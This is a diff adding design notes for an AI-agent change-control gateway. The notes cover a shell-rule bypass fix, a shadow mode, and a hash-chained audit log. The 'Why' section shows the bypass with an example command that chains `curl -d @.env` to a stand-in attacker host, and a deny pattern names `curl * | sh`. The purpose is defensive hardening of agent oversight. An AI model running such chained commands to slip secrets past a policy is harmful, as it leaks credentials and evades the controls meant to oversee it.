@@ -2591,3 +2591,133 @@ documented prompt to update the other.
   `MAX_OUTPUT_BYTES_CEILING` (per language) each have exactly one
   definition; `SetOutputPreviewBytes`/`MaxOutputPreviewBytes` have zero
   (fully removed, not just deprecated).
+
+## Shell command splitting, shadow mode, and a tamper-evident audit log — three cheap fixes found comparing against squidbrake
+
+### Why
+
+Reviewing squidbrake (an open-source Python agent change-control gateway)
+for ideas surfaced one real bypass and two cheap features:
+
+- **Bypass:** `shell` rules matched one glob against the whole command
+  string, and `*` matches anything including `&&`. Any allow pattern
+  ending in `*` approved whatever was chained after it — verified with
+  `agentctl policy test`: `allow: "git status*"` let
+  `git status && curl -d @.env https://evil.example` through.
+- **Shadow mode:** the only way to try a policy before enforcing it was
+  offline trace files (`agentctl policy test`); there was no way to run it
+  live against real traffic without blocking anything.
+- **Tamper evidence:** the audit log was plain JSONL; anything with write
+  access could edit or delete a line undetectably.
+
+### What changed
+
+- **`engine/shell.go`** — `parseShellCommands` splits a line into every
+  command it runs: across `;` `&&` `||` `|` `&` newlines and `( )`, inside
+  `$(...)`, backticks and `<(...)` (including inside double quotes, not
+  single), and through `sh/bash/zsh -c` and `eval`. Quote-aware; never
+  expands or runs anything; recursion bounded (`maxShellDepth`). Redirections
+  (`2>&1`, `&>f`) are not mistaken for background jobs.
+  `evaluateShell` (`engine/decision.go`) now: deny patterns match the whole
+  line (so `"curl * | sh*"` still works) **or** any command in it, also in
+  normalized forms (quotes removed, `/bin/rm` → `rm`, wrappers `sudo`/`env`/
+  `xargs`/`nohup`/`nice`/`timeout`/`VAR=x` stripped); allow patterns must
+  match **every** command's literal text; any part requiring approval makes
+  the whole line require approval; an unsplittable line (unclosed quote or
+  paren) is denied as `shell-unparseable`. A single plain command is judged
+  exactly as before. Deny reasons name the offending part.
+- **Shadow mode** — top-level `mode: enforce|shadow` (`Policy.Mode`,
+  `Policy.Shadow()`). `daemon.Decide` turns any non-allow decision into
+  allow (no approval wait, no notifier), keeps the matched rule, prefixes
+  the reason with `shadow mode: would have been <x>:`, and records
+  `AuditEvent.ShadowDecision`. `Decision` stays what actually happened.
+  `engine.Evaluate` is untouched, so `policy test` still tests enforcement.
+  `agentctl run` (hardened mode) refuses a shadow policy, since the sandbox
+  can't "only record". `agentctl audit tail|query` shows
+  `allow (shadow: would deny)`.
+- **Hash-chained audit log** — every line now ends in
+  `"chain":"<sha256(prev link + "\n" + line body)>"`, appended textually to
+  the exact bytes written (no re-marshaling at verify time). Appends take an
+  exclusive `flock` and read the file's current last line, because the
+  daemon, `agentctl proxy` and `agentctl mcp-proxy` default to the *same*
+  policy-scoped log from separate processes — a per-process in-memory
+  "previous hash" would have produced interleaved, broken chains. A log
+  written before this change keeps working: its first chained line anchors
+  to the hash of the last old line. The `bufio.Writer` (flushed after every
+  line anyway) is gone; lines are written with one `Write`.
+  `daemon.VerifyAuditLog` + new `agentctl audit verify [--policy|--audit]`
+  read the file directly (no daemon) and report the first broken line, the
+  count of pre-chain lines, and the head hash.
+
+### Guardrail: why new code
+
+- **`parseShellCommands` and helpers (`engine/shell.go`)** — closest
+  existing symbols are `matchAnyGlob`/`compileGlob` (`engine/match.go`),
+  which match one string against one pattern; they're still what does the
+  matching. Nothing in the repo tokenized shell syntax, and the splitter is
+  only called from `evaluateShell`.
+- **`matchShellDeny`/`matchShellAllow`/`withShellPart`** — the two loops
+  that were inline in `evaluateShell`, extracted because they now run once
+  per command instead of once per line. Not second implementations.
+- **`Policy.Mode`/`Shadow()`, `AuditEvent.ShadowDecision`** — extend the
+  existing `Policy` and the one audit-event struct; applied in the one
+  decision funnel (`daemon.Decide`), not per enforcement point.
+- **`chainLine`/`splitChain`/`chainLink`/`readLastLine`/`VerifyAuditLog`/
+  `AuditVerifyReport`** — closest existing symbol is
+  `AuditLogger.appendLine`, which now uses them; verification has to read
+  the file without a logger (no daemon running), so it's a free function
+  next to it rather than a method. No second writer or log format.
+- **`runAuditVerify`** — a subcommand of the existing `agentctl audit`, not
+  a new command group.
+
+### Deferred / known gaps
+
+- **Behavior change for allow patterns written as pipelines.** An allow
+  rule like `"cd * && npm test"` no longer matches as one string — each of
+  `cd x` and `npm test` must be allowed on its own. Also, `git commit -m
+  "$(date)"` now requires `date` to be allowed. Both deliberately fail
+  closed. No shipped example policy relied on the old behavior.
+- Shell parsing doesn't model heredocs, `case` arm patterns, aliases or
+  functions defined earlier in the session, or what a script file does
+  when run (`python x.py`). These over-split (fail closed) or are out of
+  scope, never under-split, except the last one.
+- Output redirection (`echo x > ~/.bashrc`) is not a separate action; a
+  write via redirection is only caught by a shell pattern, not by
+  `filesystem` rules.
+- Truncation from the **end** of the audit log isn't detectable from the
+  file alone (the shorter chain still verifies). `audit verify` prints the
+  head hash to record elsewhere; shipping it to the cloud via the forwarder
+  as an external checkpoint is the obvious follow-up. An attacker who can
+  rewrite the whole file can also recompute the chain — same fix.
+- The dashboard ingests events with fixed columns, so `shadow_decision`
+  is dropped on the way to the cloud; the cloud sees shadow-mode events as
+  plain allows. Needs a column + a "would deny" view.
+- `flock` is Unix-only, matching the release targets (linux/darwin).
+
+### Verification run at this milestone
+
+- `go build ./...`, `go vet ./...`, `gofmt -l .` (empty) — clean.
+- `export AGENTGUARD_DASHBOARD_TEST_DB=postgres:///agentguard_dashboard_test && go test -race -p 1 ./...` — all pass, including:
+  - `TestShellJudgesEveryCommandInALine` (33 cases: chains, pipes,
+    background jobs, newlines, subshells, `$()`/backticks/`<()`, `bash -c`,
+    `eval`, `if/then`, `sudo -u`, `env`, `xargs`, `/bin/rm`, `r"m"`;
+    quoted separators and `2>&1` not split; single-quoted `$()` literal;
+    unclosed quote/paren denied), `TestShellReasonNamesTheOffendingPart`,
+    `TestShellNestingIsBounded`; existing `TestShell*` unchanged and passing.
+  - `TestShadowModeAllowsButRecordsWhatWouldHaveHappened` (would-deny and
+    would-approve both run without waiting; allowed actions get no shadow
+    decision; unknown `mode` rejected).
+  - `TestAuditChainVerifiesAndDetectsTampering` (edited, deleted,
+    reordered, inserted lines and a torn write all detected; outcome patch
+    lines chained too), `TestAuditChainAnchorsOntoAPreChainLog`,
+    `TestAuditChainSurvivesTwoWritersOnOneFile` (two loggers on one file,
+    concurrently, 100 lines → one intact chain),
+    `TestAuditChainHandlesLinesLongerThanOneReadChunk`.
+- `cd examples/openai-coding-agent && pytest -q` — 13 passed (real
+  `agentctl` + real shell policy).
+- Manual, real binary: `agentctl policy test` on the original bypass trace
+  now passes (`git status && curl ...` denied). A `mode: shadow` daemon
+  allowed that command, and `audit tail` showed `allow (shadow: would deny)
+  ... default-deny`. `audit verify` printed OK on the resulting log, then
+  `BROKEN ... line 1` (exit 1) after a `sed` edited one decision.
+  `agentctl run` with a shadow policy exits 1 with an explanation.
